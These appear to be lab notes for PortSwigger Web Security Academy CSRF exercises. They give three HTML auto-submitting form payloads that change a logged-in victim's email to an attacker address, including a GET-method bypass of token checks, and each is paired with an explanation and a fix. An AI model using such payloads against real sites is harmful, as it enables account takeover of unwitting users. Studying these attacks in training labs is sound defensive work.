# CSRF (Cross-Site Request Forgery)

PortSwigger Web Security Academy — CSRF labs.

> Note: the original notes for these three PoCs didn't record which specific
> lab each one solved. They're grouped here by mechanism. If you still have
> the lab tabs open, swap in the real lab name/link for each — see
> [PortSwigger's CSRF lab index](https://portswigger.net/web-security/csrf)
> to match them up.

## PoC 1 — Basic CSRF, POST-based email change

**Vulnerability:** The "change email" endpoint accepts a `POST` request with no anti-CSRF token at all.
**Goal:** Force a logged-in victim to change their account email to an attacker-controlled address.
**Payload:**
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker123@evil.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
**Why it works:** Browsers automatically attach a logged-in user's session cookie to cross-origin requests. With no CSRF token (or other origin check) validated server-side, the endpoint can't tell this request apart from one the real user intended.
**Fix:** Require a per-session, unpredictable CSRF token on all state-changing requests, and validate it server-side before acting.

---

## PoC 2 — Method-based bypass (GET accepted where POST is protected)

**Vulnerability:** The endpoint is protected against CSRF when called via `POST`, but the same action is also reachable via `GET`, which skips the token check entirely.
**Goal:** Force the same email-change action, but exploit the fact that `GET` requests don't trigger the CSRF defense.
**Payload:**
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="attacker123@evil.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
**Why it works:** The CSRF defense was implemented for one HTTP method only. Since the server accepted the same state-changing action via a different, unprotected method, the defense could simply be routed around.
**Fix:** Apply CSRF validation to the action itself, regardless of which HTTP method reaches it — and avoid allowing state-changing operations over `GET` at all, since `GET` requests are also easier to trigger via plain links and image tags.

---

## PoC 3 — Basic CSRF (second instance)

**Vulnerability:** Same root cause as PoC 1 — a state-changing `POST` endpoint with no CSRF token validation.
**Goal:** Force the victim's email to change via an auto-submitting cross-origin form.
**Payload:**
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker123@evil.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
**Why it works / Fix:** Same as PoC 1.
